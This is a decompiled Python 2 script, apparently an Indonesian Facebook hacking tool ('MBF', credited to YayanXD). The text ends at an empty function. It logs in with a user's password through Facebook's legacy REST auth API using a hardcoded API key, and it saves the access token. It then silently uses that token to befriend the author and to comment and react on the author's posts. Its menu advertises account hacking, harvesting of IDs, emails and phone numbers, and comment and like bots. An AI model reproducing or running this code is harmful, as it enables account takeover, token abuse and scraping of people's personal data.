# Decompile by : Hamid Meer'hamii 
# Time Succes decompile : 2022-03-26 18:16:47.173597
# Source Generated with Decompyle++
# File: out.pyc (Python 2.7)

import os
import sys
import time
import mechanize
import itertools
import datetime
import random
import hashlib
import re
import threading
import json
import getpass
import urllib
import cookielib
from multiprocessing.pool import ThreadPool
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
my_color = [
    P,
    M,
    H,
    K,
    B,
    U,
    O]
warna = random.choice(my_color)
warni = random.choice(my_color)

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')


try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 mbf.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
br.addheaders = [
    ('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
os.system('clear')
done = False

def animate():
    for c in itertools.cycle([
        '\x1b[1;91m||',
        '\x1b[1;92m/',
        '\x1b[1;93m\xe2\x94\x80',
        '\x1b[1;96m|',
        '\x1b[1;95m\\']):
        if done:
            break
        sys.stdout.write('\r\x1b[1;93mYayanXD\x1b[1;94m:) ' + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c)
        sys.stdout.flush()
        time.sleep(0.1)
    

t = threading.Thread(target = animate)
t.start()
time.sleep(5)
done = True

def keluar():
    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} \x1b[1;93mSelamat Tinggal..'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i
    
    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))
    
    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.0003)
    

logo = '\n\x1b[1;96m\t\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n\x1b[1;96m\t\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n\x1b[1;96m\t\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \n\x1b[1;94m\t\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d  \n\x1b[1;94m\t\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \n\x1b[1;94m\t\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d     \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d   \x1b[1;93mVol.07\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\x1b[1;96m  \xe2\x96\xbc\xef\xbf\xa3\xef\xbc\x9e-\xe2\x80\x95-\xef\xbc\x9c\xef\xbf\xa3\xe2\x96\xbc  \x1b[1;95mAuthor   \x1b[1;91m: \x1b[1;92mYayanXD\n\x1b[1;96m   \xef\xbc\xb9\xe3\x80\x80     \xef\xbc\xb9   \x1b[1;95mGithub   \x1b[1;91m: \x1b[1;92mgithub.com/Yayan-XD\n\x1b[1;96m/\\ /   \x1b[1;91m\xe2\x97\x8f  \x1b[1;92m\xcf\x89 \x1b[1;91m\xe2\x97\x8f\x1b[1;96m\xef\xbc\x89  \x1b[1;95mWhatsApp \x1b[1;91m: \x1b[1;92m08560303XNXX\n\x1b[1;96m\\ \xef\xbd\x9c\xe3\x80\x80 \xe3\x81\xa4\xe3\x80\x80  \xe3\x83\xbd\xe3\x81\xa4\x1b[1;95mInstagram \x1b[1;91m: \x1b[1;92m@yayanxd_\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\x1b[1;95m         {\x1b[1;97mWELCOME BACK SLURD DI SC AING\x1b[1;95m}                     \n\x1b[1;92m   Jangan lupa follow instagram gua & facebook\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
logo1 = '\n\x1b[1;96m\t\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n\x1b[1;96m\t\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n\x1b[1;96m\t\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \n\x1b[1;94m\t\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d  \n\x1b[1;94m\t\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \n\x1b[1;94m\t\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d     \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d   \x1b[1;93mVol.07\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\x1b[1;96m  \xe2\x96\xbc\xef\xbf\xa3\xef\xbc\x9e-\xe2\x80\x95-\xef\xbc\x9c\xef\xbf\xa3\xe2\x96\xbc  \x1b[1;95mAuthor   \x1b[1;91m: \x1b[1;92mYayanXD\n\x1b[1;96m   \xef\xbc\xb9\xe3\x80\x80     \xef\xbc\xb9   \x1b[1;95mGithub   \x1b[1;91m: \x1b[1;92mgithub.com/Yayan-XD\n\x1b[1;96m/\\ /   \x1b[1;91m\xe2\x97\x8f  \x1b[1;92m\xcf\x89 \x1b[1;91m\xe2\x97\x8f\x1b[1;96m\xef\xbc\x89  \x1b[1;95mWhatsApp \x1b[1;91m: \x1b[1;92m08560303XNXX\n\x1b[1;96m\\ \xef\xbd\x9c\xe3\x80\x80 \xe3\x81\xa4\xe3\x80\x80  \xe3\x83\xbd\xe3\x81\xa4\x1b[1;95mInstagram \x1b[1;91m: \x1b[1;92m@yayanxd_\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\x1b[1;91m                  PERHATIAN\n\x1b[1;92m    Setelah anda memasuka akun fb<\xe2\x97\x8f>token\n\x1b[1;92m  Akan Berkomentar otomatis ke profil author\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'

def tik():
    titik = [
        '.   ',
        '..  ',
        '... ']
    for o in titik:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mLoading \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)
    

back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
gagal = []
idteman = []
idfromteman = []
idmem = []
emmem = []
nomem = []
id = []
em = []
emfromteman = []
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

def sayang():
    os.system('clear')
    print logo
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;91m{\x1b[1;97m01\x1b[1;91m}\x1b[1;96m Login Akun  Facebook Baru'
    print '\x1b[1;91m{\x1b[1;97m02\x1b[1;91m}\x1b[1;96m Login Token Facebook'
    print '\x1b[1;91m{\x1b[1;97m00\x1b[1;91m}\x1b[1;91m Keluar'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    msuk = raw_input('\x1b[1;91m\xe2\x95\x9a\xe2\x95\x90\x1b[1;96m>>> \x1b[1;94m')
    if msuk == '':
        print '\x1b[1;91m[!] Salah pilih yang benar'
        sayang()
    elif msuk == '1':
        kontol()
    elif msuk == '2':
        tokenz()
    elif msuk == '0':
        keluar()
    else:
        print '\x1b[1;91m[!] Salah pilih yang benar'
        sayang()


def kontol():
    os.system('reset')
    
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo1
        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN AKUN FACEBOOK \x1b[1;91m[\xe2\x98\x86]'
        id = raw_input('\x1b[1;91m[+] \x1b[1;36mID\x1b[1;97m|\x1b[1;96mEmail\x1b[1;97m \x1b[1;91m:\x1b[1;92m ')
        pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword \x1b[1;91m:\x1b[1;92m ')
        tik()
        
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;91m[!] Tidak Ada Koneksi'
            keluar()

        br._factory.is_html = True
        br.select_form(nr = 0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {
                    'api_key': '882a8490361da98702bf97a021ddc14d',
                    'credentials_type': 'password',
                    'email': id,
                    'format': 'JSON',
                    'generate_machine_id': '1',
                    'generate_session_cookies': '1',
                    'locale': 'en_US',
                    'method': 'auth.login',
                    'password': pwd,
                    'return_ssl_resources': '0',
                    'v': '1.0' }
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({
                    'sig': a })
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params = data)
                z = json.loads(r.text)
                zedd = open('login.txt', 'w')
                zedd.write(z['access_token'])
                zedd.close()
                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                yayan_gantenx()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;91m[!] Tidak Ada Koneksi'
                keluar()
            

        if 'checkpoint' in url:
            print '\n\x1b[1;91m[!] \x1b[1;93mSepertinya Akun Anda Terkena Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;91m[!] Login gagal'
            os.system('rm -rf login.txt')
            time.sleep(0.01)
            sayang()



def tokenz():
    os.system('clear')
    print logo1
    toket = raw_input('\x1b[1;91m[?] \x1b[1;97mMasukan Token \x1b[1;91m: \x1b[1;94m ')
    
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print '\n\x1b[1;95mLogin Berhasil.\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2.'
        yayan_gantenx()
    except KeyError:
        print '\x1b[1;91m[!] Token Salah'
        e = raw_input('\x1b[1;91m[?] \x1b[1;96mAnda Tau token? Kalo Tidak Tau Pm saya!\x1b[1;91m{\x1b[1;96my\x1b[1;97m/\x1b[1;93mn\x1b[1;91m}\x1b[1;97m: ')
        if e == '':
            keluar()
        elif e == 'y':
            sayang()
        else:
            keluar()



def yayan_gantenx():
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token invalid'
        os.system('rm -rf login.txt')

    una = '100007639052164'
    kom = 'User Tools Mbf\xf0\x9f\x98\x98'
    reac = 'ANGRY'
    post = '2657012877896655'
    post2 = '2657012877896655'
    kom2 = 'Script Mbf Keren Bang\xf0\x9f\x98\x81'
    reac2 = 'LOVE'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
    menu()


def menu():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('reset')
        print '\x1b[1;91m[!] \x1b[1;93mAkun Anda Terkena Checkpoint'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[!] Tidak Ada Koneksi'
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;95m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Nama \x1b[1;91m: \x1b[1;92m' + nama + '\x1b[1;97m'
    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m ID   \x1b[1;91m: \x1b[1;92m' + id
    print '\x1b[1;95m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;93m{\x1b[1;95m01\x1b[1;93m}\x1b[1;97m Informasi pengguna  '
    print '\x1b[1;93m{\x1b[1;95m02\x1b[1;93m}\x1b[1;97m Dapatkan Id/email/hp'
    print '\x1b[1;93m{\x1b[1;95m03\x1b[1;93m}\x1b[1;97m Hack Akun Facebok   '
    print '\x1b[1;93m{\x1b[1;95m04\x1b[1;93m}\x1b[1;97m Bot komen & auto like'
    print '\x1b[1;93m{\x1b[1;95m05\x1b[1;93m}\x1b[1;97m Lainnya             '
    print '\x1b[1;93m{\x1b[1;95m06\x1b[1;93m}\x1b[1;97m Cek Token Anda      '
    print '\x1b[1;93m{\x1b[1;95m07\x1b[1;93m}\x1b[1;97m Update tools        '
    print '\x1b[1;93m{\x1b[1;95m08\x1b[1;93m}\x1b[1;97m Hapus sampah        '
    print '\x1b[1;93m{\x1b[1;95m09\x1b[1;93m}\x1b[1;97m Bonus               '
    print '\x1b[1;93m{\x1b[1;95m00\x1b[1;93m}\x1b[1;97m Keluar              '
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    pilih()


def pilih():
    zedd = raw_input('\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m>>> \x1b[1;97m')
    if zedd == '':
        print '\x1b[1;91m[!] Salah pilih yang benar'
        pilih()
    elif zedd == '1':
        informasi()
    elif zedd == '2':
        dump()
    elif zedd == '3':
        menu_hack()
    elif zedd == '4':
        menu_bot()
    elif zedd == '5':
        lain()
    elif zedd == '6':
        os.system('clear')
        print logo
        toket = open('login.txt', 'r').read()
        print '\x1b[1;91m[+] \x1b[1;92mtoken anda \x1b[1;91m : \x1b[1;97m ' + toket
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        menu()
    elif zedd == '7':
        perbarui()
    elif zedd == '8':
        os.remove('out')
    elif zedd == '9':
        os.system('rm -rf login.txt')
        os.system('xdg-open https://www.facebook.com/YAYAN.XING.ZUCKERBERG.SR')
        keluar()
    elif zedd == '0':
        sayang()
    else:
        print '\x1b[1;91m[!] Salah pilih yang benar'
        pilih()


def informasi():
